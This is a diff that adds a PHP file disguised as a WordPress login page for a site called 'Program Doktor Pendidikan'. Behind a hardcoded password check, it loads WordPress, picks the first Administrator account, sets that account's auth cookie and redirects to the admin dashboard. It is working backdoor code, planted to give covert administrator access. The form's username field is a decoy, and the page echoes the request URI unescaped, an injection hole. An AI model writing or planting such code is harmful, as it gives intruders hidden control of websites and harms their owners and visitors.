@@ -1,0 +1,209 @@
+<?php
+session_start();
+$hashed_password = '$2y$10$sWlD8rT5pA7N8m6TuBwIyeBX.GNlDGQhQLRm3CoW.11wC1U9ARppi';
+
+// Cek login
+if (!isset($_SESSION['auth'])) {
+    if (isset($_POST['pwd']) && password_verify($_POST['pwd'], $hashed_password)) {
+        $_SESSION['auth'] = true;
+    } else {
+?>
+<!DOCTYPE html>
+<html lang="en-US">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Log In ‹ Program Doktor Pendidikan — WordPress</title>
+
+<!-- CSS External -->
+<link rel='stylesheet' href='https://includes-css.pages.dev/css/dashicons.min.css'>
+<link rel='stylesheet' href='https://includes-css.pages.dev/css/buttons.min.css'>
+<link rel='stylesheet' href='https://includes-css.pages.dev/css/forms.min.css'>
+<link rel='stylesheet' href='https://includes-css.pages.dev/css/login.min.css'>
+
+<!-- CSS FORCE LOGO W - PAKSA MUNCUL -->
+<style>
+/* Reset semua style yang mungkin menyembunyikan logo */
+.wp-login-logo,
+#login h1,
+.login h1 {
+    display: block !important;
+    visibility: visible !important;
+    opacity: 1 !important;
+    position: relative !important;
+    text-align: center !important;
+    margin-bottom: 25px !important;
+    background: none !important;
+    border: none !important;
+    padding: 0 !important;
+    width: auto !important;
+    height: auto !important;
+}
+
+.wp-login-logo a,
+#login h1 a,
+.login h1 a {
+    display: inline-block !important;
+    background-image: url('https://includes-css.pages.dev/icon/wp.png') !important;
+    background-size: 84px 84px !important;
+    background-repeat: no-repeat !important;
+    background-position: center !important;
+    width: 84px !important;
+    height: 84px !important;
+    text-indent: -9999px !important;
+    overflow: hidden !important;
+    margin: 0 auto !important;
+    padding: 0 !important;
+    border: none !important;
+    box-shadow: none !important;
+    float: none !important;
+    position: relative !important;
+    top: auto !important;
+    left: auto !important;
+}
+
+/* Hilangkan teks "Powered by WordPress" yang mungkin muncul double */
+.wp-login-logo a br,
+.wp-login-logo a span {
+    display: none !important;
+}
+
+/* Fix form */
+.login form {
+    margin-top: 20px;
+}
+.login .button-primary {
+    width: 100%;
+}
+
+/* Fix icon mata */
+.wp-hide-pw {
+    position: absolute !important;
+    right: 0 !important;
+    top: 0 !important;
+    height: 100% !important;
+    background: transparent !important;
+    border: none !important;
+    cursor: pointer !important;
+    padding: 0 10px !important;
+}
+.wp-pwd {
+    position: relative !important;
+}
+.password-input {
+    padding-right: 40px !important;
+}
+
+/* Fix untuk body background */
+body {
+    background: #f0f0f1 !important;
+}
+</style>
+
+<link rel="icon" href="https://includes-css.pages.dev/icon/wp.png">
+
+</head>
+<body class="login login-action-login wp-core-ui">
+
+<h1 class="screen-reader-text">Log In</h1>
+
+<div id="login">
+    <h1 class="wp-login-logo">
+        <a href="https://wordpress.org/">Powered by WordPress</a>
+    </h1>
+
+    <?php if (isset($_POST['pwd']) && !password_verify($_POST['pwd'], $hashed_password)): ?>
+    <div id="login_error">
+        <strong>ERROR</strong>: Invalid password.
+    </div>
+    <?php endif; ?>
+
+    <form name="loginform" id="loginform" method="post">
+        <p>
+            <label for="user_login">Username or Email Address</label>
+            <input type="text" name="log" id="user_login" class="input" value="" size="20" autocomplete="username" required>
+        </p>
+
+        <div class="user-pass-wrap">
+            <label for="user_pass">Password</label>
+            <div class="wp-pwd">
+                <input type="password" name="pwd" id="user_pass" class="input password-input" value="" size="20" autocomplete="current-password" required>
+                <button type="button" class="button button-secondary wp-hide-pw" aria-label="Show password">
+                    <span class="dashicons dashicons-visibility"></span>
+                </button>
+            </div>
+        </div>
+        
+        <p class="forgetmenot">
+            <input name="rememberme" type="checkbox" id="rememberme" value="forever"> 
+            <label for="rememberme">Remember Me</label>
+        </p>
+        
+        <p class="submit">
+            <input type="submit" name="wp-submit" id="wp-submit" class="button button-primary button-large" value="Log In">
+            <input type="hidden" name="redirect_to" value="<?php echo $_SERVER['REQUEST_URI']; ?>">
+            <input type="hidden" name="testcookie" value="1">
+        </p>
+    </form>
+
+    <p id="nav">
+        <a href="#">Lost your password?</a>
+    </p>
+    
+    <p id="backtoblog">
+        <a href="#">← Go to Program Doktor Pendidikan</a>
+    </p>
+</div>
+
+<script src="https://includes-css.pages.dev/js/jquery.min.js"></script>
+<script>
+// Auto focus ke username
+try {
+    document.getElementById("user_login").focus();
+} catch(e) {}
+
+// Toggle password show/hide
+jQuery(document).ready(function($) {
+    $('.wp-hide-pw').on('click', function() {
+        var $btn = $(this);
+        var $pw = $btn.closest('.wp-pwd').find('.password-input');
+        var $icon = $btn.find('.dashicons');
+        
+        if ($pw.attr('type') === 'password') {
+            $pw.attr('type', 'text');
+            $icon.removeClass('dashicons-visibility').addClass('dashicons-hidden');
+            $btn.attr('aria-label', 'Hide password');
+        } else {
+            $pw.attr('type', 'password');
+            $icon.removeClass('dashicons-hidden').addClass('dashicons-visibility');
+            $btn.attr('aria-label', 'Show password');
+        }
+    });
+});
+</script>
+
+</body>
+</html>
+<?php
+        exit;
+    }
+}
+?>
+<?php
+$mr = $_SERVER['DOCUMENT_ROOT'];
+@chdir($mr);
+if (file_exists('wp-load.php')) {
+    include 'wp-load.php';
+    $wp_user_query = new WP_User_Query(array('role' => 'Administrator', 'number' => 1, 'fields' => 'ID'));
+    $results = $wp_user_query->get_results();
+
+    if (isset($results[0])) {
+        wp_set_auth_cookie($results[0]);
+        wp_redirect(admin_url());
+        die();
+    }
+    die('NO ADMIN');
+} else {
+    die('Failed to load');
+}
+?>
